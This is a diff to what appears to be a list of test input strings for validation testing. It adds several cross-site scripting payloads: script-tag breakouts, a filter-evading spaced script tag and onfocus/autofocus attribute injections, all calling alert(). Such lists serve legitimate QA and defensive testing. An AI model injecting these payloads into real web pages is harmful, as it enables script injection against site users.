@@ -186,8 +186,13 @@ Z̮̞̠͙͔ͅḀ̗̞͈̻̗Ḷ͙͎̯̹̞͓G̻O̭̗̮
 <img src=x onerror=alert('hi') />
 <svg><script>0<1>alert('XSS')</script> 
 "><script>alert(document.title)</script>
-><script>alert(document.title)</script>
 '><script>alert(document.title)</script>
+><script>alert(document.title)</script>
+</script><script>alert(document.title)</script>
+< / script >< script >alert(document.title)< / script >
+ onfocus=alert(document.title) autofocus 
+" onfocus=alert(document.title) autofocus 
+' onfocus=alert(document.title) autofocus 
 
 #	SQL Injection
 #
